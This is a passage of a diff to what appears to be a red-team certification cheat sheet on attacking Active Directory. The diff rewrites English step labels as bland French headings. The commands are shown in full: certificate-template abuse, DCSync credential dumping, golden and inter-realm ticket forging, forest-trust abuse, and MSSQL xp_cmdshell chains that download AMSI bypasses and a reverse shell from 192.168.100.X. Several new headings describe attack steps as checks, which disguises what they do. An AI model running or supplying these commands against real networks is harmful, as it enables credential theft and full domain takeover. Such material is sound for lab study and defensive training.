 C:\AD\Tools\Rubeus.exe asktgt /user:<user> /certificate:C:\AD\Tools\user.pfx /password:SecretPass@123 /nowrap /ptt
 C:\AD\Tools\Certify.exe request /ca:domain-DC.domain.local\DOMAIN-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator
 ```
 
-> *Copy all the text between -----BEGIN RSA PRIVATE KEY----- and -----END CERTIFICATE----- and save it to cert.pem*
+### OpenSSL - PKCS#12
 
+Convertit le certificat et sa clé en fichier PFX avec OpenSSL.
 
-C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx
+`C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\DA.pfx`
 
-**Finally, request a TGT for the DA**:
+### AD CS - TGT
+
+Illustre la demande d'un TGT à partir d'un certificat PFX.
+
 ```powershell
 C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\DA.pfx /password:SecretPass@123 /nowrap /ptt
 winrs -r:dc whoami
 ```
 
-**For EA**
+### AD CS - Enterprise Admin
 
-**Request and convert to PFX, then request the TGT**:
+Présente un exemple de demande de TGT pour un compte d'une autre portée administrative.
+
 ```powershell
 C:\AD\Tools\Rubeus.exe asktgt /user:domain.local\Administrator /dc:domain-dc.domain.local /certificate:C:\AD\Tools\EA.pfx /password:SecretPass@123 /nowrap /ptt
 winrs -r:domain-dc whoami
 ```
 
-   </div>
-  </details>
+## Azure AD Connect
 
-  <details>
-    <summary>Azure AD Connect</summary>
-    <div class="content" markdown="1">
+Repères sur les comptes MSOL utilisés avec Azure AD Connect.
+
+### Azure AD Connect - MSOL Accounts
+
+Recherche des comptes MSOL et prépare un contexte d'authentification.
 
 ```powershell
 Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server domain.local -Properties * | select SamAccountName,Description | fl
@@ -767,19 +827,28 @@ cd C:\Users\<user>\Downloads
 RunWithRegistryNonAdmin.bat
 ```
 
-**Extract credentials of MSOL_**:
+### Azure AD Connect - Credentials
+
+Exécute un script d'examen des identifiants liés à AD Connect.
+
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('http://192.168.100.x/adconnect.ps1')
 ADconnect
 ```
 
-**Now we can run DCsync (From elevated shell)**:
+### MSOL - Elevated Session
+
+Utilise une session dotée d'identifiants MSOL pour interroger la réplication AD.
+
 ```powershell
 runas /user:domain.local\MSOL_16fb75d0227d /netonly cmd
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\administrator /domain:domain.local" "exit"
 ```
 
-**DCsync (from a normal shell)**:
+### MSOL - Standard Session
+
+Présente une variante du même contrôle depuis un environnement PowerShell standard.
+
 ```powershell
 runas /user:domain.local\MSOL_16fb75d0227d /netonly cmd
 C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
@@ -787,19 +856,13 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Invoke-Mimi -Command '"lsadump::dcsync /user:domain\administrator /domain:domain.local"'
 ```
 
+## Domain Privesc (TrustKey & KRBTGT)
 
-   </div>
-  </details>
+Exemples de tickets Kerberos et de relations de confiance entre domaines.
 
-  <details>
-    <summary>Domain Privesc (TrustKey & KRBTGT)</summary>
-    <div class="content" markdown="1">
- 
+### TrustKey - Initial Context
 
-
-**Using TRUSTKEY**
-
-**With DA - Escalate to EA or DA of the parent domain**:
+Prépare un contexte d'authentification, des outils distants et une interaction avec les clés de trust.
 
 ```powershell
 C:\AD\Tools\Rubeus.exe asktgt /user:administrator /aes256:<hash> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
@@ -810,72 +873,92 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 lsadump::trust /patch
 ```
 
-> Grab the RC4 of [ In ] child domain -> parent domain**
-   
-**Create the inter-realm TGT using the trust key**:   
+### TrustKey - Inter-Realm TGT
+
+Illustre la construction d'un ticket inter-realm reposant sur une clé de relation de confiance.
+
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:<hash> /user:Administrator /service:krbtgt /target:domain.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
 ```
+
+### TrustKey - Service Ticket
+
+Présente une demande de ticket de service CIFS au moyen d'un ticket inter-realm.
 
 ``` powershell
 C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/domain-dc.domain.local /dc:domain-dc.domain.local /ptt
 ```
 
+### Kerberos - Ticket Cache
+
+Affiche les tickets Kerberos présents dans le cache courant.
+
 ``` powershell
 klist
 ```
 
+### CIFS - Share Access
+
+Teste l'accès à un partage administratif avec le contexte d'authentification actif.
+
 ``` powershell
 dir \\domain-dc.domain.local\c$
 ```
- 
 
-**Using KRBTGT Hash**
+### KRBTGT - SID History
 
-**Create inter-realm TGT with SID history for Enterprise Admins**:
+Présente un ticket Kerberos intégrant des SID supplémentaires.
+
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:<hash> /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt" "exit"
 klist
 winrs -r:domain-dc cmd
 ```
 
+## Abuse Trust Relationship (Forest)
 
-   </div>
-  </details>
+Énumération et illustration des mécanismes d'authentification inter-forêts.
 
-  <details>
-    <summary>Abuse Trust Relationship (Forest)</summary>
-    <div class="content" markdown="1">
- 
+### Forest Trust - Kerberos Context
 
+Regroupe un exemple de ticket Kerberos et une requête de réplication.
 
 ```powershell
 C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /aes256:<hash> /ptt"
 lsadump::dcsync /user:domain\user$ /domain:domain.local
 ```
 
-**Copy SafetyKatz and Rubeus**:
+### Forest Trust - Tool Transfer
+
+Copie des exécutables vers un contrôleur de domaine distant.
+
 ```powershell
 echo F | xcopy C:\AD\Tools\BetterSafetyKatz.exe \\dc.domain.local\C$\Users\Public\BetterSafetyKatz.exe /Y
 echo F | xcopy C:\AD\Tools\Rubeus.exe \\dc.domain.local\C$\Users\Public\Rubeus.exe /Y
 ```
 
-**Forge an inter-realm TGT**:
+### Forest Trust - Inter-Realm Ticket
+
+Présente un ticket inter-realm associé à une relation de confiance inter-forêts.
+
 ```powershell
 winrs -r:dc.domain.local cmd
 C:\Users\Public\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /rc4:<hash> /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\Users\Public\sharedwithdomain.kirbi" "exit"
 C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwithdomain.kirbi /service:CIFS/dc.domain.local /dc:dc.domain.local /ptt
 ```
 
-**With the CIFS service we can access the share**:
+### CIFS - Remote Share
+
+Vérifie l'accès à un partage CIFS dans la forêt distante.
+
 ```powershell
 dir \\dc.domain.local\eushare
 ```
 
-> Access the target forest using PowerShell Remoting
+### Forest Trust - Remote Environment
 
+Copie et lance les composants d'un environnement PowerShell distant.
 
-**Check if SIDHistroy is enabled for the trust between the 2 Forests**:
 ```powershell
 echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\dc.domain.local\C$\Users\Public\InShellProf.dll /Y
 echo F | xcopy C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat \\dc.domain.local\C$\Users\Public\RunWithRegistryNonAdmin.bat /Y
@@ -883,32 +966,40 @@ winrs -r:dc.domain.local cmd
 C:\Users\Public\RunWithRegistryNonAdmin.bat
 ```
 
-**Check if there are any groups with SID>1000**:
+### Forest Trust - Group SIDs
+
+Recherche des groupes dont les identifiants SID répondent au filtre défini.
+
 ```powershell
 Get-ADGroup -Filter 'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"' -Server domain.local
 ```
 
+### Forest Trust - SID History Ticket
 
-**Create an inter-realm ticket and Inject the SIDHistory**:
+Illustre la construction d'un ticket inter-realm avec des SID supplémentaires.
+
 ```powershell
 C:\Users\Public\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:<hash> /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\domainnet.kirbi" "exit"
 ```
 
-**Request a TGS for HTTP**:
+### Forest Trust - HTTP TGS
+
+Demande un ticket de service HTTP et vérifie l'accès distant.
+
 ```powershell
 C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\domainnet.kirbi /service:HTTP/domain-net.domain.local /dc:dc.domain.local /ptt
 winrs -r:domain-net.domain.local cmd
 whoami /groups
 ```
 
-   </div>
-  </details>
+## MSSQL
 
-  <details>
-    <summary>MSSQL</summary>
-    <div class="content" markdown="1">
+Requêtes d'énumération SQL Server, linked servers et paramètres d'exécution.
 
-**Enumerate database links**:
+### PowerUpSQL - Linked Servers
+
+Recense les instances SQL Server, leurs liens et le contexte de certaines requêtes.
+
 ```powershell
 Import-Module .\PowerupSQL-master\PowerupSQL.psd1
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
@@ -917,14 +1008,20 @@ Get-SQLServerLinkCrawl -Instance us-mssql -Verbose
 Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
 ```
 
-**Open a Listener**:
+### Powercat - Listener
+
+Démarre un listener et présente une commande distante liée à SQL Server.
+
 ```powershell
 . .\powercat.ps1
 powercat -l -v -p 443 -t 1000
 Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)"'''
 ```
 
-**Enable RPC Out and xp_cmdshell with SA permission**:
+### SQL Server - RPC Out et xp_cmdshell
+
+Modifie des paramètres de serveur lié et de fonctionnalité SQL Server.
+
 ```powershell
 Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"
 Invoke-SqlCmd -Query "exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"
@@ -932,24 +1029,29 @@ Invoke-SqlCmd -Query "EXECUTE ('sp_configure ''show advanced options'',1;reconfi
 Invoke-SqlCmd -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""
 ```
 
-**Now Try to execute commands recursively again**:
+### SQL Server - Linked Query
+
+Relance une requête via un linked server pour examiner son résultat.
+
 ```powershell
 Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''whoami'''
 ```
 
-**Execute commands in a particular link database**:
+### SQL Server - Remote Command
+
+Présente une requête SQL qui déclenche une commande PowerShell à distance.
+
 ```powershell
 Get-SQLServerLinkCrawl -Instance us-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget db-sqlsrv
 ```
 
-   </div>
-  </details>
+## Foreign Security Principals (FSPs)
 
-  <details>
-    <summary>Foreign Security Principals (FSPs)</summary>
-    <div class="content" markdown="1">
- 
+Identification des Foreign Security Principals, groupes et ACL inter-domaines.
 
+### FSP - PowerView
+
+Charge PowerView et prépare l'énumération des relations entre forêts.
 
 ```powershell
 iex (New-Object Net.WebClient).DownloadString('http://192.168.100.x/PowerView.ps1')
@@ -957,37 +1059,50 @@ Note: Make sure to bypass AMSI before executing powershell commands
 Get-ForestTrust
 ```
 
-**Search for**:
+### Forest ACLs
 
-- TrustType: Forest 
-- TrustDirection: Bidirectional
+Recherche les ACL significatives dans un domaine d'une autre forêt.
 
 ```powershell
 Find-InterestingDomainAcl -ResolveGUIDs -Domain dbvendor.local
 ```
 
-> See if any *IdentityReferenceName* has *ActiveDirectoryRights* (GenericAll) to any *ObjectDN*
+### Forest ACL - Password Change
+
+Illustre l'effet d'un droit d'écriture sur le mot de passe d'un compte.
 
 ```powershell
 Set-DomainUserPassword -Identity dbxsvc -AccountPassword (ConvertTo-SecureString 'Password@123' -AsPlainText -Force) -Domain dbvendor.local –Verbose
 ```
 
-**Enumerate FSPs**:
+### Foreign Groups
+
+Recherche les groupes contenant des principaux de sécurité externes.
+
 ```powershell
 Find-ForeignGroup –Verbose
 ```
 
-**Get-DomainUser**:
+### Foreign SID Lookup
+
+Identifie un utilisateur de domaine à partir de son SID.
+
 ```powershell
 Get-DomainUser -Domain dbvendor.local | ?{$_.ObjectSid -eq 'S-1-5-21-569087967-1859921580-1949641513-4101'}
 ```
 
-**Accessing with WINRS**:
+### Foreign Account - WinRS
+
+Teste une connexion WinRS avec des identifiants de domaine.
+
 ```powershell
 winrs -r:db-dc.db.local -u:dbvendor\dbxsvc -p:Password@123 "whoami"
 ```
 
-**Accessing with PowerShell Remote**:
+### Foreign Account - Remoting
+
+Crée un objet PSCredential puis ouvre une session PowerShell distante.
+
 ```powershell
 $passwd = ConvertTo-SecureString 'Password@123' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("dbvendor\dbxsvc", $passwd)
@@ -995,29 +1110,30 @@ $dbdc = New-PSSession -Computername db-dc.db.local -Credential $creds
 Invoke-Command -scriptblock{whoami;hostname} -Session $dbdc
 ```
 
+## PAM Trust
 
-   </div>
-  </details>
+Analyse des PAM Trusts, Shadow Principals et connexions entre forêts.
 
-  <details>
-    <summary>PAM Trust</summary>
-    <div class="content" markdown="1">
- 
+### PAM Trust - Foreign Principals
 
+Énumère les objets Foreign Security Principal du domaine désigné.
 
-**Enumerate Foreign Security Principals**:
 ```powershell
 Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server domain.local
 ```
 
-**Find out which group DA it is a member of**:
+### PAM Trust - Group Membership
+
+Identifie les groupes contenant un principal défini par son SID.
+
 ```powershell
 Get-ADGroup -Filter * -Properties Member -Server domain.local | ?{$_.Member -match 'S-1-5-21-2781415573-3701854478-2406986946-500'}
 ```
 
-> In this case the DA is a member of the built-in administrators group on the target forest
+### PAM Trust - DA Context
 
-**So we need to grab a DA access**: 
+Prépare une session d'administration du domaine et les outils associés.
+
 ```powershell
 C:\AD\Tools\Rubeus.exe asktgt /domain:<domain> /user:administrator /aes256:<hash> /dc:<dc> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 echo F | xcopy C:\AD\Tools\InviShell\InShellProf.dll \\dc.domain.local\C$\Users\Public\InShellProf.dll /Y
@@ -1026,19 +1142,18 @@ winrs -r:dc.domain.local cmd
 C:\Users\Public\RunWithRegistryNonAdmin.bat
 ```
 
-**Check if PAM trust is enabled**:
+### PAM Trust - Discovery
+
+Filtre les relations de confiance selon leurs attributs ForestTransitive et SIDFiltering.
+
 ```powershell
 Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
 ```
 
-**Search for**:
+### PAM Trust - Replication
 
-- ForestTransitive : True
-- SIDFilteringForestAware : False
-- the DistinguishedName
+Présente des exemples d'accès à des données répliquées entre domaines.
 
-
-**Use the privileges of DA to extract credentials of DA of the target Forest**:
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:domain\Administrator /domain:domain.local" "exit"
 C:\AD\Tools\Rubeus.exe asktgt /domain:domain.local /user:administrator /aes256:<hash> /dc:<dc> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
@@ -1048,68 +1163,69 @@ winrs -r:dc.domain.local cmd
 C:\Users\Public\RunWithRegistryNonAdmin.bat
 ```
 
-**Enumerate other Forests**:
+### PAM Trust - Other Forests
+
+Interroge les relations de confiance depuis une autre forêt.
+
 ```powershell
 Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} -Server production.local
 ```
 
-**Search for**:
+### Shadow Security Principals
 
-- ForestTransitive : True
-- SIDFilteringForestAware : True
+Affiche les membres et les SID des objets Shadow Principal.
 
-
-**Check the membership of Shadow Security Principals**:
 ```powershell
 Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name, member, msDS-ShadowPrincipalSid | fl
 ```
 
-**Obtain the IP of Forest**:
+### Forest DNS
+
+Consulte les informations d'une zone DNS associée à une forêt.
+
 ```powershell
 Get-DnsServerZone -ZoneName production.local |fl *
 ```
 
-**Modify WSMan Trustedhosts property**:
+### WSMan - TrustedHosts
+
+Modifie la liste TrustedHosts du client WSMan, ce qui élargit les hôtes acceptés.
+
 ```powershell
 Note: Run from an elevated shell
 Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
 ```
 
-**Use PowerShell Remoting**:
+### PAM Trust - PowerShell Remoting
+
+Présente une connexion distante utilisant un contexte d'authentification négocié.
+
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:administrator /domain:domain.local /ntlm:<hash> /run:powershell.exe" "exit"
 Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential
 ```
 
-   </div>
-  </details>
+## Mindmaps
 
-  <details>
-    <summary>Mindmaps</summary>
-    <div class="content" markdown="1">
- 
+Schémas récapitulatifs pour Active Directory, les ACL et les outils associés.
 
-AD Mindmap:
+### AD Mindmap
 
-![Alt text](/assets/images/posts/crte/6.png){: .align-center}
+![AD Mindmap](/assets/images/posts/crte/6.png)
 
-AD Recommendations:
+### AD Recommendations
 
-![Alt text](/assets/images/posts/crte/7.png){: .align-center}
+![AD Recommendations](/assets/images/posts/crte/7.png)
 
-DACL:
+### DACL
 
-![Alt text](/assets/images/posts/crte/8.png){: .align-center}
+![DACL](/assets/images/posts/crte/8.png)
 
-Bypass AV:
+### Bypass AV
 
-![Alt text](/assets/images/posts/crte/9.png){: .align-center}
+![Bypass AV](/assets/images/posts/crte/9.png)
 
-Bloodhound Collector:
+### BloodHound Collector
 
-![Alt text](/assets/images/posts/crte/10.png){: .align-center} 
-
-  </div>
-  </details>
-</div>
+![BloodHound Collector](/assets/images/posts/crte/10.png)
 
